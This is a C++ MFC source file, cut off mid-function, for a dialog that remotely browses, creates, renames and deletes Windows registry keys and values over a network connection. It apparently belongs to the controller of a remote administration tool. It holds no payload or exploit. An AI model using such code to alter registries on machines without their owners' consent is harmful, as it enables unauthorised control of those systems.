// RegeditDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "RegeditDlg.h"
#include "InputDlg.h"
#include "RegeditTextDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CRegeditDlg dialog
LPCTSTR CRegeditDlg::m_strComputer = TEXT("我的电脑");
LPCTSTR CRegeditDlg::m_strDefault = TEXT("预设的子键名，如果你看到了这个键，就说明程序运行出错了！");

static UINT indicators[] =
{
	ID_SEPARATOR
};

CRegeditDlg::CRegeditDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CRegeditDlg::IDD, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;

	isEnable = true;
	nFlag = 0;
	isEdit = false;
	m_bOnClose = FALSE;
	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_REGEDIT), IMAGE_ICON, 20, 20, 0);
	isuser = false;
}


void CRegeditDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CRegeditDlg)
	DDX_Control(pDX, IDC_LIST, m_list);
	DDX_Control(pDX, IDC_TREE, m_tree);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CRegeditDlg, CDialog)
	//{{AFX_MSG_MAP(CRegeditDlg)
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_TREE, OnRclickTree)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, OnRclickList)
	ON_NOTIFY(TVN_ITEMEXPANDING, IDC_TREE, OnItemexpandingTree)
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE, OnSelchangedTree)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST, OnDblclkList)
	ON_NOTIFY(TVN_BEGINLABELEDIT, IDC_TREE, OnBeginlabeleditTree)
	ON_NOTIFY(TVN_ENDLABELEDIT, IDC_TREE, OnEndlabeleditTree)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CRegeditDlg message handlers

void CRegeditDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (m_list.m_hWnd == NULL)return;
	if (m_tree.m_hWnd == NULL)return;


	CRect rect;
	GetDlgItem(IDC_TREE)->GetWindowRect(&rect);

	CRect treeRec, listRec;
	treeRec.top = treeRec.left = 0;
	treeRec.right = rect.Width();
	treeRec.bottom = cy - 20;
	m_tree.MoveWindow(treeRec);

	listRec.top = 0;
	listRec.left = treeRec.right + 3;
	listRec.right = cx;
	listRec.bottom = cy - 20;
	m_list.MoveWindow(listRec);

	if (m_wndStatusBar.m_hWnd != NULL)
	{
		CRect rc;
		rc.top = cy - 20;
		rc.left = 0;
		rc.right = cx;
		rc.bottom = cy;
		m_wndStatusBar.MoveWindow(rc);
	}
}

void CRegeditDlg::OnCancel()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	if (IsWindow(m_hWnd))
		DestroyWindow();

}

BOOL CRegeditDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	// TODO: Add extra initialization here
	// 设置标题
	CString str;
	str.Format(_T("远程注册表 \\\\%s"), m_pContext->szAddress);
	SetWindowText(str);

	// 创建状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
			sizeof(indicators) / sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return FALSE;      // fail to create
	}
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏		

	// 创建list
	m_list.ModifyStyle(0, LVS_REPORT);
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	HICON listicon[2];
	listicon[0] = AfxGetApp()->LoadIcon(IDI_ICON5);
	listicon[1] = AfxGetApp()->LoadIcon(IDI_ICON6);
	m_ImageList.Create(16, 16, ILC_COLOR4 | ILC_MASK, 2, 2); //16,16为图标分辩率，2,2为该list最多能容纳的图标数
	for (int i = 0; i < 2; ++i)
		m_ImageList.Add(listicon[i]); //读入图标
	m_list.SetImageList(&m_ImageList, LVSIL_SMALL);
	m_list.InsertColumn(0, TEXT("名称"), LVCFMT_LEFT, 180);
	m_list.InsertColumn(1, TEXT("类型"), LVCFMT_LEFT, 150);
	m_list.InsertColumn(2, TEXT("数据"), LVCFMT_LEFT, 350);


	// 树形
	HICON treeicon[4];
	treeicon[0] = AfxGetApp()->LoadIcon(IDI_ICON1);
	treeicon[1] = AfxGetApp()->LoadIcon(IDI_ICON2);
	treeicon[2] = AfxGetApp()->LoadIcon(IDI_ICON3);
	treeicon[3] = AfxGetApp()->LoadIcon(IDI_ICON4);

	m_ImageTree.Create(16, 16, ILC_COLOR4 | ILC_MASK, 4, 4); //16,16为图标分辩率，4,4为该list最多能容纳的图标数
	for (int n = 0; n < 4; ++n)
		m_ImageTree.Add(treeicon[n]); //读入图标
	m_tree.SetImageList(&m_ImageTree, TVSIL_NORMAL);

	m_hRoot = m_tree.InsertItem(m_strComputer, 0, 1);

	HTREEITEM HKCR = m_tree.InsertItem(_T("HKEY_CLASSES_ROOT"), 2, 3, m_hRoot);
	m_tree.InsertItem(m_strDefault, 2, 3, HKCR);//为了提高运行效率,随便插入一个先

	HTREEITEM HKCU = m_tree.InsertItem(_T("HKEY_CURRENT_USER"), 2, 3, m_hRoot);
	m_tree.InsertItem(m_strDefault, 2, 3, HKCU);//为了提高运行效率,随便插入一个先

	HTREEITEM HKLM = m_tree.InsertItem(_T("HKEY_LOCAL_MACHINE"), 2, 3, m_hRoot);
	m_tree.InsertItem(m_strDefault, 2, 3, HKLM);//为了提高运行效率,随便插入一个先

	HTREEITEM HKUS = m_tree.InsertItem(_T("HKEY_USERS"), 2, 3, m_hRoot);
	m_tree.InsertItem(m_strDefault, 2, 3, HKUS);//为了提高运行效率,随便插入一个先

	HTREEITEM HKCC = m_tree.InsertItem(_T("HKEY_CURRENT_CONFIG"), 2, 3, m_hRoot);
	m_tree.InsertItem(m_strDefault, 2, 3, HKCC);//为了提高运行效率,随便插入一个先

	m_tree.Expand(m_hRoot, TVE_EXPAND);


	HWND hWndHeader = m_list.GetDlgItem(0)->GetSafeHwnd();
	m_heades.SubclassWindow(hWndHeader);
	m_heades.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	m_heades.EnablePopupMenus(FALSE);
	EnableControls(FALSE);
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);



	HTREEITEM hRootItem = (HTREEITEM)m_tree.SendMessage( TVM_GETNEXTITEM, TVGN_ROOT, NULL);
	HTREEITEM	hChildItem = (HTREEITEM)m_tree.SendMessage( TVM_GETNEXTITEM, TVGN_CHILD, (LPARAM)hRootItem);
	m_tree.SendMessage(TVM_EXPAND, TVE_EXPAND, (LPARAM)hRootItem);
	m_tree.SendMessage( TVM_GETNEXTITEM, TVGN_NEXT, (LPARAM)hRootItem);



	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}

void CRegeditDlg::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme = m_heades.GetTheme();
	if (pTheme)
	{
		DWORD dwStyle = pTheme->GetDrawStyle() & ~uFlag;

		if (bRemove)
			dwStyle |= uFlag;

		pTheme->SetDrawStyle(dwStyle, &m_heades);
		m_heades.RedrawWindow();
	}
}

void CRegeditDlg::EnableControls(BOOL bRedraw)
{
	XTOSVersionInfo()->IsWinXPOrGreater();
	XTOSVersionInfo()->IsWinXPOrGreater();

	if (bRedraw)
	{
		RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN);
	}
}

void CRegeditDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("远程注册表 \\\\ %s  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}

void CRegeditDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_REG_INFO:
		isuser = true;
		AddToTree((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
		break;
	case TOKEN_REG_KEY:
		AddToList((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
		break;
	case TOKEN_REG_ERROR:
		isEdit = false;
		break;
	case TOKEN_REG_SUCCEED:
		ShowSucceed();
		isEdit = false;
		break;
	default:
		break;
	}
	EnableCursor(true);
}

DWORD atod(char* ch)
{
	int len = strlen(ch);
	DWORD d = 0;
	for (int i = 0; i < len; i++) {
		int t = ch[i] - 48;   //这位上的数字
		if (ch[i] > 57 || ch[i] < 48) {          //不是数字
			return d;
		}
		d *= 10;
		d += t;
	}
	return d;
}
void CRegeditDlg::ShowSucceed()
{
	switch (nFlag)
	{
	case 1:
		while (m_tree.GetChildItem(SelectNode) != NULL)
		{
			m_tree.DeleteItem(m_tree.GetChildItem(SelectNode));        //删除 会产生 OnSelchangingTree事件 ***
		}
		m_tree.DeleteItem(SelectNode);
		break;
	case 2:
		m_tree.InsertItem(strPath, 2, 3, SelectNode, 0);//插入子键名称
		m_tree.Expand(SelectNode, TVE_EXPAND);
		strPath = "";
		break;
	case 3:
		m_list.DeleteItem(index);
		index = 0;
		break;
	case 4:
	{

		int nitem;
		DWORD d;
		TCHAR ValueDate[256];
		CString value;
		ZeroMemory(ValueDate, lstrlen(Value)*sizeof(TCHAR));
		switch (type)
		{
		case MREG_SZ:   //加了字串   
			nitem = m_list.InsertItem(0, Key, 0);
			m_list.SetItemText(nitem, 1, _T("REG_SZ"));
			m_list.SetItemText(nitem, 2, Value);
			break;
		case MREG_DWORD:  //加了DWORD
			d = (DWORD)_tstof(Value.GetBuffer(0));
			value.Format(_T("0x%x"), d);
			wsprintf(ValueDate, _T("  (%wd)"), d);
			value += _T(" ");
			value += ValueDate;
			nitem = m_list.InsertItem(0, Key, 1);
			m_list.SetItemText(nitem, 1, _T("REG_DWORD"));
			m_list.SetItemText(nitem, 2, value);
			break;
		case MREG_EXPAND_SZ:
			nitem = m_list.InsertItem(0, Key, 0);
			m_list.SetItemText(nitem, 1, _T("REG_EXPAND_SZ"));
			m_list.SetItemText(nitem, 2, Value);
			break;

		default:
			break;
		}

	}
	break;
	case 5:
	{
		DWORD d;
		TCHAR ValueDate[256];
		CString value;
		ZeroMemory(ValueDate, lstrlen(Value) * sizeof(TCHAR));
		switch (type) {
		case MREG_SZ:   //加了字串   

			m_list.SetItemText(index, 2, Value);
			break;
		case MREG_DWORD:  //加了DWORD
			d = (DWORD)_tstof(Value.GetBuffer(0));
			value.Format(_T("0x%x"), d);
			wsprintf(ValueDate, _T("  (%wd)"), d);
			value += " ";
			value += ValueDate;
			m_list.SetItemText(index, 2, value);
			break;
		case MREG_EXPAND_SZ:
			m_list.SetItemText(index, 2, Value);
			break;
		default:
			break;
		}
	}
	break;
	default:
		break;
	}
	nFlag = 0;
}

struct REGMSG
{
	int count;         //名字个数
	DWORD size;        //名字大小
	DWORD valsize;     //值大小	
};
void CRegeditDlg::AddToList(char* lpBuffer)
{
	m_list.DeleteAllItems();

	if (lpBuffer == NULL)
		return;

	REGMSG msg;
	memcpy((void*)&msg, lpBuffer, sizeof(msg));
	char* tmp = lpBuffer + sizeof(msg);
	for (int i = 0; i < msg.count; i++)
	{
		BYTE Type = tmp[0];   //取出标志头
		tmp += sizeof(BYTE);
		TCHAR* szValueName = (TCHAR*)tmp;   //取出名字
		tmp += msg.size;
		BYTE* szValueDate = (BYTE*)tmp;      //取出值
		tmp += msg.valsize;
		if (Type == MREG_SZ)
		{
			if (lstrlen(szValueName) == 0)
			{
				szValueName = _T("默认");
			}
			int nitem = m_list.InsertItem(0, szValueName, 0);
			m_list.SetItemText(nitem, 1, _T("REG_SZ"));
			m_list.SetItemText(nitem, 2, (TCHAR*)szValueDate);
		}
		if (Type == MREG_DWORD)
		{
			TCHAR ValueDate[256];
			DWORD d = (DWORD)szValueDate;
			memcpy((void*)&d, szValueDate, sizeof(DWORD));
			CString value;
			value.Format(_T("0x%x"), d);
			wsprintf(ValueDate, _T("  (%wd)"), d);
			value += _T(" ");
			value += ValueDate;
			int nitem = m_list.InsertItem(0, szValueName, 1);
			m_list.SetItemText(nitem, 1, _T("REG_DWORD"));
			m_list.SetItemText(nitem, 2, value);

		}
		if (Type == MREG_BINARY)
		{
			TCHAR ValueDate[256];
			wsprintf(ValueDate, _T("%wd"), szValueDate);

			int nitem = m_list.InsertItem(0, szValueName, 1);
			m_list.SetItemText(nitem, 1, _T("REG_BINARY"));
			m_list.SetItemText(nitem, 2, ValueDate);
		}
		if (Type == MREG_EXPAND_SZ)
		{
			int nitem = m_list.InsertItem(0, szValueName, 0);
			m_list.SetItemText(nitem, 1, _T("REG_EXPAND_SZ"));
			m_list.SetItemText(nitem, 2, (TCHAR*)szValueDate);
		}
	}
}


void CRegeditDlg::AddToTree(char* lpBuffer)
{
	if (lpBuffer == NULL)
		return;
	int msgsize = sizeof(REGMSG);
	REGMSG msg;
	memcpy((void*)&msg, lpBuffer, msgsize);
	DWORD size = msg.size;
	int count = msg.count;


	if (size > 0 && count > 0)
	{
		for (int i = 0; i < count; i++)
		{
			BOOL bRet = FALSE;
			memcpy(&bRet, lpBuffer + size * i + msgsize, sizeof(BOOL));


			TCHAR* szKeyName = (TCHAR*)(lpBuffer + size * i + msgsize + sizeof(BOOL));

			HTREEITEM hItemChild = m_tree.InsertItem(szKeyName, 2, 3, SelectNode, 0);//插入子键名称
			m_tree.Expand(SelectNode, TVE_EXPAND);
			if (bRet)
			{
				/*
				ps 此处路径枚举有问题 需要进一步排查
				*/
				m_tree.InsertItem(m_strDefault, 2, 3, hItemChild);//返回值不需要
			}
		}
	}
}

void CRegeditDlg::OnRclickTree(NMHDR* pNMHDR, LRESULT* pResult)
{
	
	//NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;

	//TVITEM item = pNMTreeView->itemNew;
	//if (item.hItem == m_hRoot)
	//{
	//	TRACE("根目录 不展开");
	//	return;
	//}
	//SelectNode = item.hItem;			//保存用户打开的子树节点句柄
	// TODO: Add your control notification handler code here
	if (!isEnable)	return;
	m_treeMenu.Detach();
	m_treeMenu.DestroyMenu();
	m_treeMenu.CreatePopupMenu();
	m_treeMenu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("新建(&N)"));
	m_treeMenu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("删除(&D)"));
	m_treeMenu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("重命名(&M)"));
	m_treeMenu.AppendMenu(MF_SEPARATOR, NULL);
	m_treeMenu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("复制项名称(&C)"));
	POINT mousepoint;
	GetCursorPos(&mousepoint);
	BOOL M_MiNiid = m_treeMenu.TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, mousepoint.x, mousepoint.y, this);
	if (!M_MiNiid) 	return;

	switch (M_MiNiid)
	{
	case 100:
	{
		OnMenuitemTreeNew();
	}
		break;
	case 200:
	{
		OnMenuitemTreeDel();
	}
	break;
	case 300:
	{
		m_tree.ModifyStyle(NULL, TVS_EDITLABELS); //设置编辑风格
		g_sSelectStr = m_tree.GetItemText(m_tree.GetSelectedItem());
		m_tree.EditLabel(m_tree.GetSelectedItem());

	}
	break;	
	case 400:
	{
		OnMenuitemTreeCopyname();
	}
	break;
	default:
		break;
	}

	*pResult = 0;
}

void CRegeditDlg::GetRegTree(NM_TREEVIEW* pNMTreeView)
{
	if (!isEnable) return;
	TVITEM item = pNMTreeView->itemNew;
	if (item.hItem == m_hRoot)
	{
		TRACE("%s back", __FUNCTION__);
		return;
	}
	SelectNode = item.hItem;			//保存用户打开的子树节点句柄

	// list重置
	m_list.DeleteAllItems();

	CString FullPath = GetFullPath(SelectNode);
	m_wndStatusBar.SetPaneText(0, FullPath);

	// 删除节点下的数据
	while (m_tree.GetChildItem(item.hItem) != NULL)
	{
		m_tree.DeleteItem(m_tree.GetChildItem(item.hItem));        //删除 会产生 OnSelchangingTree事件 ***
	}

	BYTE bToken = GetFatherPath(FullPath);

	// 加一个默认键
	int nitem = m_list.InsertItem(0, _T("(默认)"), 0);
	m_list.SetItemText(nitem, 1, _T("REG_SZ"));
	m_list.SetItemText(nitem, 2, _T("(数值未设置)"));

	FullPath.Insert(0, bToken);//插入  那个根键
	bToken = COMMAND_REG_ENUM;
	FullPath.Insert(0, bToken);      //插入查询命令
	EnableCursor(false);

	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), (FullPath.GetLength() + 1)*sizeof(TCHAR));
}


CString CRegeditDlg::GetFullPath(HTREEITEM hCurrent)
{
	CString strTemp;
	CString strReturn = _T("");
	while (1)
	{
		if (hCurrent == m_hRoot) return strReturn;
		strTemp = m_tree.GetItemText(hCurrent);   //得到当前的
		if (strTemp.Right(1) != _T("\\"))
			strTemp += _T("\\");
		strReturn = strTemp + strReturn;
		hCurrent = m_tree.GetParentItem(hCurrent);   //得到父的

	}
	return strReturn;
}

BYTE CRegeditDlg::GetFatherPath(CString& FullPath)
{
	BYTE bToken;
	if (!FullPath.Find(_T("HKEY_CLASSES_ROOT")))	//判断主键
	{
		//MKEY=HKEY_CLASSES_ROOT;
		bToken = MHKEY_CLASSES_ROOT;
		FullPath.Delete(0, sizeof(_T("HKEY_CLASSES_ROOT")) / sizeof(TCHAR));
	}
	else if (!FullPath.Find(_T("HKEY_CURRENT_USER")))
	{
		bToken = MHKEY_CURRENT_USER;
		FullPath.Delete(0, sizeof(_T("HKEY_CURRENT_USER")) / sizeof(TCHAR));

	}
	else if (!FullPath.Find(_T("HKEY_LOCAL_MACHINE")))
	{
		bToken = MHKEY_LOCAL_MACHINE;
		FullPath.Delete(0, sizeof(_T("HKEY_LOCAL_MACHINE")) / sizeof(TCHAR));

	}
	else if (!FullPath.Find(_T("HKEY_USERS")))
	{
		bToken = MHKEY_USERS;
		FullPath.Delete(0, sizeof(_T("HKEY_USERS")) / sizeof(TCHAR));

	}
	else if (!FullPath.Find(_T("HKEY_CURRENT_CONFIG")))
	{
		bToken = MHKEY_CURRENT_CONFIG;
		FullPath.Delete(0, sizeof(_T("HKEY_CURRENT_CONFIG")) / sizeof(TCHAR));
	}
	return bToken;
}


void CRegeditDlg::OnItemexpandingTree(NMHDR* pNMHDR, LRESULT* pResult)
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here

	if (pNMTreeView->action == TVE_COLLAPSE)
	{
		return;
	}

	GetRegTree(pNMTreeView);

	*pResult = 0;
}

void CRegeditDlg::EnableCursor(bool bEnable)
{
	if (bEnable)
	{
		isEnable = true;
		::SetCursor(::LoadCursor(NULL, IDC_ARROW));
	}
	else
	{
		isEnable = false;
		::SetCursor(LoadCursor(NULL, IDC_WAIT));
	}
}

void CRegeditDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}

void CRegeditDlg::OnBeginlabeleditTree(NMHDR* pNMHDR, LRESULT* pResult)
{
	TV_DISPINFO* pTVDispInfo = (TV_DISPINFO*)pNMHDR;
	m_tree.GetEditControl()->LimitText(1024);
	*pResult = 0;
}

//防止修改的数据有相同 嵌套循环
HTREEITEM CRegeditDlg::FindItem(HTREEITEM item, CString strText)
{
	HTREEITEM hFind;
	if (item == NULL)
	{
		return NULL;
	}
	while (item != NULL)
	{
		if (m_tree.GetItemText(item) == strText)
		{
			return item;
		}
		if (m_tree.ItemHasChildren(item))
		{
			item = m_tree.GetChildItem(item);
			hFind = FindItem(item, strText);
			if (hFind)
			{
				return hFind;
			}
			else
			{
				item = m_tree.GetNextSiblingItem(m_tree.GetParentItem(item));
			}
		}
		else
		{
			item = m_tree.GetNextSiblingItem(item);
			if (item == NULL)
			{
				return NULL;
			}
		}
	}
	return item;
}

void CRegeditDlg::OnEndlabeleditTree(NMHDR* pNMHDR, LRESULT* pResult)
{
	TV_DISPINFO* pTVDispInfo = (TV_DISPINFO*)pNMHDR;

	
	CString strName; //修改后的数据
	m_tree.GetEditControl()->GetWindowText(strName);
	if (strName.IsEmpty())
	{
		MessageBox(_T("数据项名称不能为空，请重新输入!"));
		EnableCursor(false);
		return;
	}
	if (strName == g_sSelectStr)
	{
		EnableCursor(false);
		return;
	}
	HTREEITEM hRoot = m_tree.GetRootItem();
	HTREEITEM hFind = FindItem(hRoot, strName); //判断数据是否相同
	if (hFind == NULL)
	{
		TCHAR msg[MAX_PATH] = { 0 };
		wsprintf(msg, _T("修改信息为 %s, 确定吗 ? "), strName);
		if (MessageBox(msg, _T("提示"), MB_OKCANCEL) == IDOK)
		{
			CString FullPath = GetFullPath(SelectNode);      //得到全路径

			BYTE bToken = GetFatherPath(FullPath);
	
			int oldsize = (FullPath.GetLength() + 1) * sizeof(TCHAR);
			int newsize = (strName.GetLength() + 1) * sizeof(TCHAR);
			int sendsize = 1+1 + sizeof(int) * 2 + oldsize + newsize;
			char* sendate = new char[sendsize];
			sendate[0] = COMMAND_REG_RENAME;
			sendate[1] = bToken;
			memcpy(sendate + 2, &oldsize, sizeof(int));
			memcpy(sendate + 2+ sizeof(int), &newsize, sizeof(int));
			memcpy(sendate + 2 + sizeof(int)*2, FullPath.GetBuffer(0), oldsize);
			memcpy(sendate + 2+ sizeof(int) * 2+ oldsize, strName.GetBuffer(0), newsize);


			EnableCursor(false);

			m_iocpServer->Send(m_pContext, (LPBYTE)sendate, sendsize);
			SAFE_DELETE_AR(sendate);
			//CString strText;
			//m_tree.GetEditControl()->GetWindowText(strText.GetBuffer(200), 200);
			//m_tree.SetItemText(m_tree.GetSelectedItem(), strText);//设置编辑后的文本为结点
			*pResult = TRUE;

		}
		else
		{
			EnableCursor(false);
			return;
		}
	}
	else //找到相同数据  
	{
		EnableCursor(false);
			MessageBox(_T("该数据已存在"));
	}
	EnableCursor(false);
	*pResult = 0;

}

//判断是否处于编辑状态 传按键进去 然后发送消息
BOOL CRegeditDlg::IsTreeCtrlEditMessage(WPARAM KeyCode)
{
	BOOL rvalue = FALSE;
	CWnd* pWnd = this;
	CTreeCtrl* treectrl = (CTreeCtrl*)pWnd->GetDlgItem(IDC_TREE);
	if (!treectrl)
	{
		return rvalue;
	}
	CWnd* focus = GetFocus();
	CEdit* edit = treectrl->GetEditControl();
	if ((CEdit*)focus == edit)
	{
		if (KeyCode == VK_ESCAPE)
		{
			edit->SendMessage(WM_UNDO, KeyCode); //ESC撤销
		}
		if (KeyCode == VK_RETURN)
		{
			edit->SendMessage(WM_KEYDOWN, KeyCode); //回车就执行
		}
		rvalue = TRUE;
	}
	return rvalue;
}

//重载回车键
void CRegeditDlg::OnOK()
{
	if (!IsTreeCtrlEditMessage(VK_RETURN))
	{
		return;
	}
}


void CRegeditDlg::OnSelchangedTree(NMHDR* pNMHDR, LRESULT* pResult)
{
	
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	GetRegTree(pNMTreeView);

	*pResult = 0;
}

void CRegeditDlg::OnMenuitemTreeNew()
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("新建子键"), _T("请输入要创建的子键名称:"), this);
	if (dlg.DoModal() != IDOK)
		return;

	CString FullPath = GetFullPath(SelectNode);      //得到全路径
	FullPath += dlg.m_str;
	BYTE bToken = GetFatherPath(FullPath);

	FullPath.Insert(0, bToken);//插入  那个根键
	bToken = COMMAND_REG_CREATEKEY;
	FullPath.Insert(0, bToken);      //插入查询命令

	nFlag = 2;
	strPath = dlg.m_str;

	EnableCursor(false);

	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), (FullPath.GetLength() + 1) * sizeof(TCHAR));
}

void CRegeditDlg::OnMenuitemTreeDel()
{
	// TODO: Add your command handler code here
	CString FullPath = GetFullPath(SelectNode);      //得到全路径


	if (MessageBox(_T("确定删除  ") + FullPath + _T("键吗"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;
	BYTE bToken = GetFatherPath(FullPath);

	FullPath.Insert(0, bToken);//插入  那个根键
	bToken = COMMAND_REG_DELKEY;
	FullPath.Insert(0, bToken);      //插入查询命令
	nFlag = 1;

	EnableCursor(false);

	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), (FullPath.GetLength() + 1) * sizeof(TCHAR));
}

void CRegeditDlg::OnMenuitemRegexit()
{
	// TODO: Add your command handler code here
	SendMessage(WM_CLOSE, 0, 0);
}

BYTE CRegeditDlg::GetEditType(int index)
{
	if (index < 0) return 100;
	CString strType = m_list.GetItemText(index, 1);      //得到类型
	if (strType == "REG_SZ")
		return  MREG_SZ;
	else if (strType == "REG_DWORD")
		return MREG_DWORD;
	else if (strType == "REG_EXPAND_SZ")
		return MREG_EXPAND_SZ;
	else
		return 100;
}

// 双击list
void CRegeditDlg::OnDblclkList(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here

	OnMenuitemRegEdit();

	*pResult = 0;
}

void CRegeditDlg::OnMenuitemRegEdit()
{
	// TODO: Add your command handler code here
	int index = m_list.GetSelectionMark();
	if (index < 0)return;
	BYTE bType = GetEditType(index);

	switch (bType)
	{
	case MREG_SZ:
		isEdit = true;        //变为可编辑状态
		Key = m_list.GetItemText(index, 0);      //得到名
		Value = m_list.GetItemText(index, 2);      //得到值
		OnMenuitemRegStr();
		nFlag = 5;
		this->index = index;
		break;
	case MREG_DWORD:
		Key = m_list.GetItemText(index, 0);      //得到名
		Value.Format(_T("%s"), m_list.GetItemText(index, 2));      //得到值
		Value.Delete(0, Value.Find(_T('(')) + 1);        // 去掉括号
		Value.Delete(Value.GetLength() - 1);      //
		isEdit = true;             //变为可编辑状态
		OnMenuitemRegDword();
		nFlag = 5;
		this->index = index;
		break;
	case MREG_EXPAND_SZ:
		isEdit = true;        //变为可编辑状态
		Key = m_list.GetItemText(index, 0);      //得到名
		Value = m_list.GetItemText(index, 2);      //得到值
		OnMenuitemExstr();
		nFlag = 5;
		this->index = index;
		break;
	default:
		break;

	}
}

void CRegeditDlg::OnMenuitemRegStr()
{
	// TODO: Add your command handler code here
	CRegeditTextDlg dlg(this);
	if (isEdit)
	{                //是编辑
		dlg.m_strName = Key;
		dlg.m_strValue = Value;
		dlg.EPath = true;
	}

	dlg.DoModal();
	if (dlg.isOK)
	{
		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		char bToken = GetFatherPath(FullPath);
		DWORD size = 1 + 1 + 1 + sizeof(REGMSG) + FullPath.GetLength() * sizeof(TCHAR) + dlg.m_strName.GetLength() * sizeof(TCHAR) + dlg.m_strValue.GetLength() * sizeof(TCHAR) + 6;
		char* buf = new char[size];
		ZeroMemory(buf, size);

		REGMSG msg;
		msg.count = FullPath.GetLength() * sizeof(TCHAR);            //项大小
		msg.size = dlg.m_strName.GetLength() * sizeof(TCHAR);          //键大小
		msg.valsize = dlg.m_strValue.GetLength() * sizeof(TCHAR);        //数据大小

		buf[0] = COMMAND_REG_CREATKEY;               //数据头
		buf[1] = MREG_SZ;                           //值类型
		buf[2] = bToken;                           //父键
		memcpy(buf + 3, (void*)&msg, sizeof(msg));                     //数据头
		char* tmp = buf + 3 + sizeof(msg);
		if (msg.count > 0)
			memcpy(tmp, FullPath.GetBuffer(0), msg.count);        //项  
		tmp += msg.count;
		memcpy(tmp, dlg.m_strName.GetBuffer(0), msg.size);          //键名
		tmp += msg.size;
		memcpy(tmp, dlg.m_strValue.GetBuffer(0), msg.valsize);          //值
		tmp = buf + 3 + sizeof(msg);

		// 善后
		type = MREG_SZ;
		nFlag = 4;
		Key = dlg.m_strName;
		Value = dlg.m_strValue;
		//
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size);
		delete[] buf;
	}
}

void CRegeditDlg::OnMenuitemRegDword()
{
	// TODO: Add your command handler code here
	CRegeditTextDlg dlg(this);
	dlg.isDWORD = true;
	if (isEdit)
	{                //是编辑
		dlg.m_strName = Key;
		dlg.m_strValue = Value;
		dlg.EPath = true;

	}
	dlg.DoModal();
	if (dlg.isOK)
	{
		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		char bToken = GetFatherPath(FullPath);
		DWORD size = 1 + 1 + 1 + sizeof(REGMSG) + FullPath.GetLength() * sizeof(TCHAR) + dlg.m_strName.GetLength() * sizeof(TCHAR) + dlg.m_strValue.GetLength() * sizeof(TCHAR) + 6;
		char* buf = new char[size];
		ZeroMemory(buf, size);

		REGMSG msg;
		msg.count = FullPath.GetLength() * sizeof(TCHAR);            //项大小
		msg.size = dlg.m_strName.GetLength() * sizeof(TCHAR);          //键大小
